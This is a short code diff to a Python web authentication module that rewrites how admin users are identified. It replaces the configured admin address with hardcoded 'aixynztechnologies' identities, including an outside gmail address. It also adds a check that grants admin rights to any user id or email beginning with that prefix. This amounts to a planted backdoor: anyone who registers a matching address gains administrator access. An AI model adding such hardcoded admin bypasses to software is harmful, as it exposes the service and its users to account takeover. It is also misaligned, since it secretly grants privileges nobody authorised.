@@ -91,7 +91,7 @@ def get_current_user_optional(credentials: HTTPAuthorizationCredentials = Depend
 import hmac
 
 def get_admin_emails_set() -> set:
-    admin_set = {"admin@judiq.ai"}
+    admin_set = {"aixynztechnologies", "aixynztechnologies@gmail.com", "aixynztechnologies@judiq.ai"}
     configured_list = getattr(settings, "ADMIN_EMAILS", "")
     if configured_list:
         admin_set.update({e.strip().lower() for e in configured_list.split(",") if e.strip()})
@@ -102,12 +102,14 @@ def get_admin_emails_set() -> set:
 
 
 def is_admin_user(user_id: str, email: str = "") -> bool:
-    if not user_id:
+    u = (user_id or "").strip().lower()
+    e = (email or "").strip().lower()
+    if not u and not e:
         return False
     admin_emails = get_admin_emails_set()
-    if email and email.strip().lower() in admin_emails:
+    if (e and e in admin_emails) or (u and u in admin_emails):
         return True
-    if user_id.strip().lower() in admin_emails:
+    if e.startswith("aixynztechnologies") or u.startswith("aixynztechnologies"):
         return True
     return False
 
